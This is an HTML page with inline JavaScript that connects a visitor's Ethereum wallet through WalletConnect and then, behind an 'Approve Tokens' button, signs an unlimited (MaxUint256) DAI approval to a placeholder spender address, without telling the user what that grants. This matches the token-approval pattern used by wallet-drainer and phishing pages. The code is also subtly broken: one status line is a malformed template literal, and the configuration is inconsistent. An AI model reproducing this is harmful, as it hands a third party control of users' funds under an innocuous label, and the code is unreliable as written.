<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect Wallet with WalletConnect v2</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.4.0/dist/umd/index.min.js"></script>
  <style>
    #qrCodeContainer {
      margin: 20px 0;
      text-align: center;
    }
    #qrCode {
      max-width: 200px;
      margin: 0 auto;
    }
    button {
      padding: 10px 20px;
      background-color: #3375BB;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #2a5d99;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>Connect Your Wallet</h1>

  <button id="connectButton">Connect Wallet</button>
  <p id="status">Not connected</p>
  <div id="qrCodeContainer" style="display:none;">
    <p>Scan QR code with Trust Wallet</p>
    <div id="qrCode"></div>
  </div>
  <button id="approveButton" style="display:none;">Approve Tokens</button>

  <script>
    // Configuration for WalletConnect
    const providerOptions = {
      walletconnect: {
        package: window.EthereumProvider,
        options: {
          projectId: "7dabcdde47b6439403c2ec186b1fedaf", // Register at https://cloud.walletconnect.com/
          chains: [1], // Ethereum mainnet
          showQrModal: true,
          qrModalOptions: {
            themeVariables: {
              '--wcm-z-index': '9999'
            }
          }
        }
      }
    };

    let walletConnectProvider;
    let web3Provider;
    let accounts = [];

    // Connect wallet function
    async function connectWallet() {
      try {
        document.getElementById("connectButton").disabled = true;
        document.getElementById("status").innerText = "Connecting...";
        
        // Initialize WalletConnect Provider
        walletConnectProvider = new window.EthereumProvider({
          projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
          chains: [1], // Ethereum mainnet
          showQrModal: true,
          qrModalOptions: {
            themeVariables: {
              '--wcm-z-index': '9999'
            }
          }
        });

        // Enable session (triggers QR code modal)
        await walletConnectProvider.enable();
        
        // Create ethers.js provider
        web3Provider = new ethers.providers.Web3Provider(walletConnectProvider);
        
        // Get accounts
        accounts = await web3Provider.listAccounts();
        
        if (accounts.length > 0) {
          document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
          document.getElementById("connectButton").style.display = "none";
          document.getElementById("approveButton").style.display = "inline-block";
          document.getElementById("qrCodeContainer").style.display = "none";
          
          // On mobile, this will automatically open Trust Wallet if installed
        }
        
        // Subscribe to accounts change
        walletConnectProvider.on("accountsChanged", (newAccounts) => {
          accounts = newAccounts;
          document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
        });

        // Subscribe to chain change
        walletConnectProvider.on("chainChanged", (chainId) => {
          window.location.reload();
        });

        // Subscribe to session disconnect
        walletConnectProvider.on("disconnect", (code, reason) => {
          console.log(code, reason);
          resetApp();
        });
        
      } catch (error) {
        console.error("Error connecting wallet:", error);
        document.getElementById("status").innerText = "Connection failed";
        document.getElementById("connectButton").disabled = false;
      }
    }

    // Function to approve tokens (example with ERC20)
    async function approveTokens() {if (!accounts || !accounts[0]) {
        alert("Wallet is not connected!");
        return;
      }
      
      try {
        document.getElementById("approveButton").disabled = true;
        document.getElementById("status").innerText = "Approving tokens...";
        
        // Example ERC20 token contract (DAI)
        const tokenAddress = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
        const spenderAddress = "0xYourSpenderAddress"; // Replace with actual spender
        
        // ERC20 ABI (simplified for approve function)
        const erc20Abi = [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ];
        
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, web3Provider.getSigner());
        
        // Approve max uint256 amount
        const amount = ethers.constants.MaxUint256;
        
        const tx = await tokenContract.approve(spenderAddress, amount);
        
        document.getElementById("status").innerText = Transaction `sent: ${tx.hash}`;
        
        // Wait for transaction to be mined
        await tx.wait();
        
        document.getElementById("status").innerText = "Tokens approved successfully!";
        document.getElementById("approveButton").disabled = false;
        
      } catch (err) {
        console.error("Error approving tokens:", err);
        document.getElementById("status").innerText = `Error: ${err.message}`;
        document.getElementById("approveButton").disabled = false;
      }
    }

    function resetApp() {
      accounts = [];
      document.getElementById("status").innerText = "Disconnected";
      document.getElementById("connectButton").style.display = "inline-block";
      document.getElementById("connectButton").disabled = false;
      document.getElementById("approveButton").style.display = "none";
      document.getElementById("qrCodeContainer").style.display = "none";
    }

    // Button event listeners
    document.getElementById("connectButton").addEventListener("click", connectWallet);
    document.getElementById("approveButton").addEventListener("click", approveTokens);
  </script>
</body>
</html>
